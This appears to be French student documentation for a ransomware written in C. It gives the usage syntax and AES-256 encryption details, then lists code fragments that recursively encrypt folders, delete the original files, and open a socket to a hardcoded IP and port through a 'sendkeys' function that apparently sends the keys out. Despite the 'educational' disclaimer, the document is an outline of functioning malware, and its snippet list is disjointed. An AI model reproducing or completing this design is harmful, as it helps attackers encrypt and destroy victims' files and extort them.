# Ransomware en C Documentation
Par Hugo, Sabri, Aba, Gaël et Stanley

## Introduction
Nous commencerons par préciser qu'un ransomware est un programme malveillant. Nous déconseillons de l'utiliser sans en connaitre son fonctionnement.

Ce ransomware est un programme qui a été créé dans un but éducatif. Nous révoquons toutes responsabilités quant à l'usage que vous pourriez en faire.

## Fonctionnement global du ransomware

(Etapes de fonctionnement)

### Chiffrement

Nous utilisons l'algorithme de cryptage AES 256

### Déchiffrement

Le ransomware fonctionne comme ceci en ligne de commande : `./ransom <path> [key]`

- path est le chemin qui pointe vers le dossier ou le fichier à chiffrer
- key est la clef qui permet de déchiffrer un dossier ou un fichier

## Compiler le programme

Nous avons réalisé le ransomware dans un environement Linux. Donc pour compiler le script nous utilisons la commande "gcc".

## Les fonctions du ransomware

`fileExists` Vérifie si un fichier existe à l'aide de diverses fonctions de la bibliothèque standard C.

`generateAESKey`

`gcc` Cette commande est utilisée pour compiler un programme en langage C à partir d'un fichier source appelé malware.c.

`#ifndef MALWARE_LIB_H`
`MALWARE_LIB_H`
`cryptFolder`
`cryptFolder(char *folder, char *keyName);`
`decryptFolder`
`int decryptFolder(char *folder, char *keyName);`

`opendir`
`opendir(folder);`
`struct`
`struct dirent* entry;`
`strcmp`
`strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name, ".") != 0 ){}`
`isFolder`
`getPath`
`appendFolder`
`(isFolder(getPath(appendFolder(folder,entry->d_name))) == 1){}`
`cryptFolder(getPath(appendFolder(folder,entry->d_name)), keyName);`
`encryptFile`
`encryptFile(appendFolder(folder,entry->d_name), appendFolder(folder,(appendFileName("encrypted_", entry->d_name))), keyName);`
`remove`
`remove(appendFolder(folder,entry->d_name));`
`closedir`
`closedir(directory);`
`readdir`
`(entry = readdir(directory)) != NULL) {}`
`strstr`
`strstr(entry->d_name, "encrypted_")`
`supStr`
`char *newName=supStr(entry->d_name, "encrypted_");`
`remove`
`remove(appendFolder(folder,entry->d_name));`
`lenStr`
`int lenStr = strlen(str);`
`lenSubStr`
`int lenSubStr = strlen(subStr);`
`const`
`const char *position = strstr(str, subStr);`
`char *newStr = malloc(lenStr - lenSubStr + 1);`
`strncpy`
`strncpy(newStr, str, position - str);`
`strcat(newStr, position + lenSubStr);`
`malloc()`
`char *copyStr = malloc(lenStr + 1);`
`int buffer = strlen(prefix) + strlen(src) + 1;`
`char *final=malloc(sizeof(char) * buffer + 1);`
`DIR* directory = opendir(path);`
`struct stat buffer;`
`helpMsg`
`void helpMsg(void)`
`sendkeys`
`int sendkeys(char *keyname);`
`generateAESKey()`
`int generateAESKey(const char *filename);`
`encryptFile`
`int encryptFile(char *inputFilename, char *outputFilename, char *keyFilename);`
`decryptFile`
`void decryptFile(char *inputFilename, char *outputFilename, char *keyFilename);`



`EVP_CIPHER_CTX_new()`
`ctx = EVP_CIPHER_CTX_new();`
`EVP_aes_256_cbc()`
`EVP_DecryptInit_ex();`
`EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, NULL);`
`EVP_DecryptFinal_ex(ctx, decryptedtext, &len)`
`handleErrors()`
`fwrite`
`fwrite(decryptedtext, 1, len, outputFile);`
`EVP_CIPHER_CTX_free(ctx);`

## Fonctions à usage plus basique

`stdio.h et stdlib.h` Ils contiennent la plupart des fonctions de base dont on a besoin dans un programme.
`#include <string.h>`
`#include <dirent.h>`
`#include <sys/stat.h>`
`#include "libSearch.h"`
`#include "crypt.h"`
`#include "malwareLib.h"`
`#include "help.h"`
`#ifndef HELP_H`
`#define HELP_H`

`main`
`int main(int argc,char** argv){ "conditions"}`
`printf`
`#define`
`#endif`
`#endif`

`#define PORT 5506`
`#define ADRESSE "192.168.233.154"`
`error`
`void error(const char *msg) {}`
`perror(msg);`
`socket()`
`socket(AF_INET, SOCK_STREAM, 0)`
`connect()`
`sizeof()`
`if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {}`
`void handleErrors(void);`
`appendFileName`
`char *appendFileName(char *path, char *prefix);`










